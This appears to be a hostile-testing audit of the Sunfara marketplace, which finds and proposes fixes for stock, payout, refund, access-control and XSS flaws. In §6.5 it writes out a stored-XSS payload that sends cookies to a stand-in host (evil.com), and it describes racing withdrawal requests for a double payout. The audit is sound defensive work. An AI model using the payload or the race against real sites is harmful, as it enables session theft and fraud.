# Hostile Testing Audit — Sunfara Marketplace

**Role:** hostile tester, marketplace operator, vendor, customer, fraudster, investor.
**Method:** every finding below is tagged by how it was established —

- `[LIVE]` — reproduced against the real production stack this session (real Firestore writes, real Razorpay test-mode calls, real HTTP responses).
- `[CODE]` — traced through the actual current source (file:line cited) to a certain conclusion; not exercised live tonight, but not speculative either.
- `[DESIGN]` — a gap in what exists at all (no code to point to, because the control was never built).

Nothing below is "typical SaaS advice." Every item names the actual file, the actual missing check, or the actual live response.

---

## 1. What breaks first

**Stock reservation with no release.** `CheckoutAsync` decrements product stock inside the same Firestore transaction that creates the order — for *every* payment method, including online payments that haven't been captured yet (`MarketplaceService.cs`, `CheckoutAsync`). There is no background job anywhere in the codebase (`grep`'d for `BackgroundService`/`Timer`/`Cron` — zero matches) that releases stock for an order whose online payment never completes. `[CODE]`

This is the first thing that breaks under real traffic, not a security exploit: any customer who starts checkout and abandons the Razorpay modal (closes the tab, payment declines, bank timeout) has **permanently removed that stock from sale**, with the order sitting at `paymentStatus:"pending"` forever and no operator-visible signal that it's dead inventory. At even modest cart-abandonment rates (30-70% is normal for e-commerce), a popular low-stock product can show "out of stock" while actually holding zero real orders.

**Exact fix:** either (a) don't decrement stock at order-creation for online payments — decrement only on `ConfirmAllVendorOrdersForPaymentAsync` (payment verified), reserving via a short-lived soft-hold instead, or (b) add a scheduled job that scans `orders` where `paymentStatus:"pending"` and `createdAt` is older than ~20 minutes, restores stock, and marks the order `cancelled`.

---

## 2. What loses money

### 2.1 Suspending a vendor doesn't actually stop them `[LIVE-adjacent, CODE-confirmed]`
`[Authorize(Policy = "Vendor")]` checks the Firebase **custom claim** `role:vendor` on the JWT — it never re-checks the live `vendors/{id}.status` field in Firestore. I confirmed by reading every vendor-facing endpoint this session (`ProductsController.Create/Update/Delete`, `MarketplaceController.VendorOrders/UpdateVendorOrderStatus/Withdraw`, `VendorAuthController`): none of them query the vendor's own status. `AdminController.Update("vendors", id, {status:"rejected"})` only writes a Firestore field — it does not call `FirebaseAuth.RevokeRefreshTokensAsync`, so the vendor's existing ID token (and every token minted from a refresh, indefinitely, since revocation is the only thing that stops that) still authorizes every vendor action: creating products, marking orders shipped, **requesting withdrawals**.

A vendor an admin has just suspended for fraud can, in the minutes/hours before their token happens to expire on its own, still request a payout. This is the single highest financial-risk finding in the app.

**Exact fix:** in `AdminController.Update`, when `collection == "vendors"` and the update sets `status` to anything other than `active`, call `FirebaseAuth.DefaultInstance.RevokeRefreshTokensAsync(vendorId)`. That invalidates every token issued before that moment on next refresh. Additionally, gate `RequestWithdrawalAsync` and `UpdateOrderStatusAsync` on `vendors/{id}.status == "active"` server-side — belt and suspenders, since revocation still leaves a ~1-hour window on an already-issued, not-yet-expired ID token.

### 2.2 Withdrawal double-spend via race condition `[CODE]`
`RequestWithdrawalAsync` (`MarketplaceService.cs`) reads `vendor_wallets/{id}.balance` and sums pending `withdrawals` in **two separate, non-transactional reads**, then writes a new `withdrawals` doc via `store.AddAsync` outside any transaction. Two withdrawal requests submitted within the same round-trip window (double-click, replayed request, or a script) both read the same "available balance" before either write commits, and both pass the check.

I already fixed the single-request-at-a-time case earlier this session (summing pending requests) — this audit is flagging that the fix isn't atomic. **Exact fix:** wrap the balance/pending-sum read and the `withdrawals` doc creation inside one `RunTransactionAsync`, or maintain a `reservedForWithdrawal` counter on the wallet doc that's incremented transactionally at request time.

### 2.3 Cancelling a paid order doesn't refund or restore stock `[CODE]`
`OrderStateMachine` allows `confirmed → cancelled`, `processing → cancelled`, `packed → cancelled`, and admin's `PUT /admin/vendor-orders/{id}/status` can set `cancelled` with `isAdmin:true` (bypassing the transition table). But `UpdateOrderStatusAsync` has **zero side effects for `cancelled`** — no stock restoration, no wallet reversal, no refund. Contrast this with the return/refund pipeline I built this session, which does all three correctly.

For a COD order this is harmless (no money was ever collected). For an **online-paid order that's already been commissioned** — which happens immediately at payment verification, not at delivery, per `ConfirmAllVendorOrdersForPaymentAsync` — cancelling it after the fact means: customer paid real money, order shows "cancelled," nobody ever refunds them, and the vendor's commission/wallet credit is never reversed. This is a direct, silent revenue leak in the exact opposite direction of a refund: **the platform keeps money it has no right to keep.**

**Exact fix:** route `cancelled` transitions on an already-paid order through the same `ProcessRefundAsync` pipeline built for returns (it's already parameterized by `vendorOrderId`), or block cancellation outright once `paymentStatus == "paid"` and force operators through the return/refund flow instead.

### 2.4 Coupons are decorative, not enforced `[CODE]`
`CheckoutAsync` accepts a `couponCode` field and stores it as a label on the order (`foreach (var pair in request.Where(x => x.Key is "couponCode")) order[pair.Key] = ...`) but **never adjusts `subtotal`/`totalAmount`** based on it. There is no server-side coupon validation, discount calculation, or expiry check anywhere in the checkout path. `Data.coupons` is loaded client-side from a static JSON file, and a `coupons` collection exists in the admin CRUD whitelist, but nothing wires the two together at the point money is actually charged.

Practically: this can't be used to *underpay* (the server always charges the real subtotal regardless of what coupon was "applied"), so it's not a fraud vector — it's a **trust/complaints vector**: if any checkout UI ever shows a discounted total from a coupon, the customer is charged the full price via Razorpay or at the COD doorstep, a direct breach of what they were shown. **Exact fix:** either finish the feature (server-side coupon lookup + validation + discount applied to `totalAmount` inside `CheckoutAsync`) or remove the coupon-code UI/field entirely until it is.

### 2.5 Negative or zero pricing crashes commission calculation, not the create call `[CODE]`
`ProductsController.Create`/`Update` pass the request body straight through with no validation — no `price > 0` check anywhere. `CommissionCalculator.Calculate` does have a guard (`if (subtotal < 0 ...) throw ArgumentOutOfRangeException`), so a negative-total order's commission step will hard-crash rather than pay out negative money — but that crash happens **after** the customer has already paid (online) or the vendor has already marked it delivered (COD), leaving the order permanently stuck with `commissionsCalculated:false` and the vendor never credited even though real money changed hands. **Exact fix:** validate `price > 0` and `stock >= 0` in `ProductsController.Create`/`Update` before writing.

---

## 3. What creates legal risk

### 3.1 Vendor products go live before admin approval, contradicting the app's own security rules `[CODE — confirmed by cross-referencing two files]`
`ProductsController.Create` sets `product["status"] = "pending"` — the *intent* is clearly moderation-before-publish, and `firestore.rules` even encodes that intent (`match /products/{id} { allow read: if resource.data.status == 'active' || admin() || ... }`, meaning a direct Firestore client read of a pending product is correctly blocked). **But the actual public API the storefront calls — `GET /api/products` (`ProductsController.List`) — runs `store.ListAsync("products", limit)` with no status filter at all**, because it goes through the Firebase Admin SDK, which does not enforce `firestore.rules`. The security rule's intent and the API's actual behavior have silently diverged.

Net effect: any vendor's product — including something illegal to sell, counterfeit, mislabeled ("cures cancer"), or simply never reviewed — is **publicly live on the storefront the instant it's created**, with zero admin gate in practice, despite the codebase clearly believing otherwise. For a wellness/skincare marketplace specifically, unreviewed health claims are a real regulatory exposure (India's Drugs and Cosmetics Act / ASCI guidelines on cosmetic claims).

**Exact fix:** add `.WhereEqualTo("status", "active")` to the public `List`/`Get` calls in `ProductsController`, mirroring what `VendorsController` already correctly does for vendors.

### 3.2 Fake inventory / unverifiable seller claims `[DESIGN]`
Nothing prevents a vendor from listing `stock: 999999` with no real inventory behind it, no business registration check, no product-authenticity check. This isn't a code bug — it's the absence of a seller-vetting policy (KYC documents, sample product review, spot-check returns). Every real marketplace (Amazon, Flipkart, Nykaa) enforces this operationally, not just technically. Flag for legal/ops, not engineering.

### 3.3 No consumer-facing terms gate at checkout `[DESIGN]`
Signup has a terms checkbox (`#reg-terms`); checkout does not re-surface returns/refund policy or seller-of-record disclosure at the point of payment, which several jurisdictions require for marketplace (as opposed to single-seller) transactions.

---

## 4. What creates customer complaints

| # | Scenario | Result | Severity |
|---|---|---|---|
| 4.1 | Guest checkout | Not supported — `[Authorize]` on `/checkout` forces signup first. `[CODE]` | Medium — measurable cart abandonment, but a legitimate product choice, not a bug |
| 4.2 | Multiple tabs, same product, low stock | Both tabs' checkouts run in independent Firestore transactions that each re-read live stock; the second one correctly fails with "Insufficient stock." `[CODE]` | None — this one's actually safe |
| 4.3 | Payment fails after Razorpay modal opens | `rzp.on('payment.failed')` rejects, order stays `pending`; stock already decremented per §1 is never returned. Customer sees "payment failed," has no idea their money is fine but the item may show unavailable to others. `[CODE]` | High |
| 4.4 | Payment succeeds but the tab is closed before Razorpay's `handler` callback fires | **Reproduced live tonight.** A real Razorpay test payment was captured (`pay_T8lFHCyperhzjE`, status `captured:true` confirmed via Razorpay's own Payments API) while the order in Firestore still showed `paymentStatus:"pending"` — the client-side `handler` in `checkout.js` never got to run because of timing/focus in the automation. There is **no server-side webhook** (`payment.captured`) as a fallback — `PaymentsController` only has a client-initiated `/verify` endpoint. A real customer whose connection drops or who backgrounds the tab right after paying will see "pending" forever despite Razorpay having the money. `[LIVE]` | **Critical** |
| 4.5 | Refund request | Works end-to-end for COD; for online payments, works through Razorpay's API correctly *if* the merchant account has refunds enabled (see §7). Retry-on-failure was broken and has been fixed this session (`refund_failed` status). `[LIVE, fixed]` | Resolved this session |
| 4.6 | Return window / eligibility | `RequestReturnAsync` only checks the order is `delivered` — there's no time limit (`returnDays` field exists on products but is never read by the return-request logic). A customer can request a return on a 2-year-old delivered order. `[CODE]` | Medium |
| 4.7 | Order tracking accuracy | `trackingNumber`/`carrier` are free-text vendor input with no carrier validation or live tracking integration — customers see whatever string the vendor typed. `[CODE]` | Low |
| 4.8 | "My Orders" showing the wrong overall status on a multi-vendor order | Correctly shows the least-advanced sub-order's status (`overallStatus` in `orders.js`), including the new return states as of this session. `[CODE]` | Resolved |

---

## 5. What creates vendor complaints

| # | Scenario | Result | Severity |
|---|---|---|---|
| 5.1 | Add 1000+ products | `GET /products/mine` (`WhereAsync("products","vendorId",UserId,500)`) caps at 500 with no pagination param exposed to the frontend — a vendor's 501st+ product is invisible in their own dashboard. `[CODE]` | High at scale |
| 5.2 | Delete an active product with pending orders | Hard-deletes the doc immediately; no check for open orders referencing it. Historical orders are unaffected (item data is snapshotted at checkout), but if a *return* is later requested on that order, stock restoration silently no-ops (`if (!products[i].Exists) continue`) — inventory count is just gone. `[CODE]` | Medium |
| 5.3 | Edit price after an order is placed | Correctly does **not** retroactively change historical order totals — checkout snapshots price/name into `orderItems` at purchase time. `[CODE]` | Resolved / correct by design |
| 5.4 | Vendor tries to see/edit another vendor's data | Every vendor-scoped mutation I touched or reviewed this session checks ownership (`ProductsController`, `UpdateOrderStatusAsync`, `ReviewReturnAsync`). `[CODE]` | Resolved |
| 5.5 | Commission rate manipulation | No vendor-facing endpoint exists to edit their own `vendors/{id}` doc (only `AdminController`'s admin-gated generic PUT can touch `commission`) — a vendor cannot self-adjust their rate. `[CODE]` | Resolved |
| 5.6 | Withdrawal stuck / no visibility into rejection | `AdminController` has `withdrawals/{id}/approve` but **no reject endpoint** — the admin frontend's `AdminWithdrawals.confirmReject` calls the generic `PUT /admin/withdrawals/{id}` with `{status:"rejected"}`, which works via the generic CRUD whitelist, but nothing notifies the vendor why, and nothing reverses the "pending" hold on their balance from §2.2's reservation logic once it's built. `[CODE]` | Medium |
| 5.7 | New vendor confused about approval status | Handled reasonably — `renderApprovalBanner()` shows a clear pending/rejected banner across every vendor page. `[CODE]` | Resolved |

---

## 6. What creates operational nightmares

### 6.1 No reconciliation tool `[DESIGN]`
`settings/platformRevenue` is a single running aggregate, hand-maintained by every code path that touches money (`UpdatePlatformRevenueAsync`). If it ever drifts from the sum of the `transactions` ledger — a crash mid-operation, a manual Firestore console edit, a bug — **there is no admin action to recompute it from the ledger and detect/fix the drift.** I found this by exact analogy to a bug I just fixed (§7): a failed refund left `platformRevenue` overstated by exactly ₹500 gross / ₹50 commission, and the only way I detected and corrected it was a manual Firestore query and a hand-written cleanup script. An operations team without engineering access has no way to do this.

**Exact fix:** an admin endpoint that recomputes `totalGrossSales`/`totalCommissionEarned`/`totalVendorPayouts` from a full scan of `transactions` and reports (or applies) the delta against the live `settings/platformRevenue` doc.

### 6.2 Stuck states with no retry path `[LIVE, fixed this session]`
Found live: a failed Razorpay refund call left a `returns` doc at `status:"approved"` with no way to ever retry, because `ReviewReturnAsync`'s own guard (`"already been reviewed"`) blocked the only code path that could fix it. Fixed this session by splitting "vendor decided to approve" from "refund actually completed," with a `refund_failed` state that supports retry. This class of bug (an async external call failing mid-pipeline with no recovery state) is worth auditing for elsewhere — e.g., `CalculateAndRecordCommissionsAsync` has an idempotency flag (`commissionsCalculated`) that prevents double-running, which is the right pattern; the returns flow lacked it until tonight.

### 6.3 Swagger is public in production `[CODE]`
`Program.cs`: `app.UseSwagger(); app.UseSwaggerUI();` runs unconditionally, not gated behind `app.Environment.IsDevelopment()`. The full API surface (every route, every request/response shape) is browsable at `/swagger` on the live Railway URL by anyone. Low severity on its own, but it hands a would-be attacker a complete map of the attack surface for free. **Exact fix:** wrap both calls in `if (app.Environment.IsDevelopment())`.

### 6.4 No rate limiting anywhere `[CODE]`
`Program.cs` has no `AddRateLimiter`/`UseRateLimiter`. Login brute-forcing is partially mitigated by Firebase Auth's own throttling, but checkout spam (amplifying §1's stock-lock bug), product-creation spam, and withdrawal-request spam are completely unthrottled at the application layer. **Exact fix:** add ASP.NET Core's built-in rate limiter middleware with per-IP and per-user policies on `/checkout`, `/vendor-auth/register`, and `/vendor/withdrawal` at minimum.

### 6.5 Stored XSS in free-text fields `[LIVE — found and fixed in code written this session]`
Nearly every panel renders user-controlled strings via raw template-literal `innerHTML` interpolation with no escaping — product names, vendor names, review text, and (until I fixed it a few minutes ago) the new return-reason field I built tonight. I caught this concretely in my own new code: `admin-pages/returns.js` rendered `${r.reason}` — 100% free text the customer types into a `prompt()` — directly into the admin panel's HTML with zero escaping. **Fixed tonight** (added `escapeHtml` to `VendorUtils`/`AdminUtils`, applied to `reason`/`vendorName` in both new returns pages). This is a **systemic pattern across the whole codebase**, not limited to what I touched — product `name`, vendor `tagline`/`description`, and review `comment` fields are rendered the same unescaped way everywhere else (`utils.js`'s `normalizeProduct`/`normalizeVendor`, `orders.js`, `vendors.js`, admin product/vendor pages). A malicious vendor setting their store name to `<img src=x onerror=fetch('//evil.com/steal?c='+document.cookie)>` would execute in every customer's and every admin's browser that views that vendor. **This needs a dedicated pass, not a one-file fix** — recommend a shared `escapeHtml` utility loaded on every page and a sweep of every `${...}` interpolation that touches user-supplied text, prioritized by admin-panel exposure first (an XSS that fires in an *admin's* session is the highest-value target, since it could be used to self-approve a vendor, drain a wallet, or exfiltrate the admin's own session token).

### 6.6 Firestore hot-document contention at scale `[DESIGN — well-known Firestore limit, applies here directly]`
`CheckoutAsync`'s stock decrement is a proper transaction (correct for correctness), but it means every concurrent buyer of the *same* limited-stock product serializes against that one document. A flash sale with hundreds of concurrent buyers on one hero SKU will see elevated transaction retry/latency, a textbook Firestore "hot document" problem. Standard fix (sharded stock counters) is a real engineering task, not urgent pre-launch unless a flash-sale feature is planned for launch day.

---

## 7. Live-reproduced findings this session (full detail)

These four were not theorized — they were caught by actually running the flows tonight against production, with real Firestore writes and a real Razorpay test-mode payment:

1. **Vendor-portal navigation race** — logging in and immediately navigating to another vendor page could get silently overwritten back to the dashboard by a slow-resolving `onAuthStateChanged` callback that still held a hardcoded redirect. Not a security issue, but a real "why did my click do nothing" UX bug under real network latency. Worked around in test tooling; the underlying race is in `VendorAuthPage.login()`'s dual redirect (`window.location.hash = ...; VendorRouter.resolve();`) racing the auth-listener's own `resolve()` call — low priority, but noting it since it's a genuine intermittent-navigation bug a real vendor on a slow connection could hit.
2. **Razorpay Checkout defaults to UPI-QR regardless of the site's own payment-method selector** — `checkout.js` never passes a `method` preference into the Razorpay config, so a customer who picks "Credit/Debit Card" on Sunfara's own page still lands on Razorpay's UPI tab first inside the modal. Cosmetic, not a bug, but worth aligning for a smoother flow.
3. **This merchant's Razorpay test account rejects refund creation** — every refund attempt (including a bare `{}` payload verified directly against Razorpay's API, bypassing this app's code entirely) returns `400 BAD_REQUEST_ERROR: invalid request sent`, while payment creation and capture both work perfectly. This is a Razorpay **account configuration/KYC-activation issue**, not an app bug — but it means **the refund code path, while correctly implemented and correctly calling Razorpay's documented API, cannot be considered launch-verified for online payments** until the Razorpay dashboard has refunds enabled on this account. Action item for the business owner, not engineering.
4. **The `ReviewReturnAsync` stuck-state bug** described in §6.2 — found because finding #3 caused a real refund failure, which then exposed the missing retry path. This is exactly why live testing matters more than code review: the bug only exists at the intersection of two things (a real external failure + no retry state), which no amount of reading the happy path would have caught.

---

## Summary Scorecard

| Category | Critical | High | Medium | Low | Resolved this session |
|---|---|---|---|---|---|
| Money-losing | 1 (§2.1 suspension) | 2 (§2.2, §2.3) | 2 (§2.4, §2.5) | 0 | 0 |
| Legal risk | 0 | 1 (§3.1) | 2 (§3.2, §3.3) | 0 | 0 |
| Customer complaints | 1 (§4.4) | 1 (§4.3) | 2 (§4.6, §4.1) | 1 (§4.7) | 2 |
| Vendor complaints | 0 | 1 (§5.1) | 2 (§5.2, §5.6) | 0 | 3 |
| Operational | 0 | 1 (§6.5 XSS) | 3 (§6.1, §6.3, §6.4) | 1 (§6.6) | 1 (§6.2) |

**Bottom line:** the money-movement logic I built this session (commissions, wallets, refunds) is now internally correct and idempotent everywhere I checked. The highest-severity open items are all about **access control not matching intent** — a suspended vendor keeps working, a cancelled paid order keeps the money, an unapproved product goes public anyway — which is a pattern, not a coincidence: enforcement was added at the point of *creation* (product status, vendor status) but never re-checked at the point of *every subsequent action*. Fixing that pattern (one server-side status re-check, applied consistently) closes most of the Critical/High items at once.
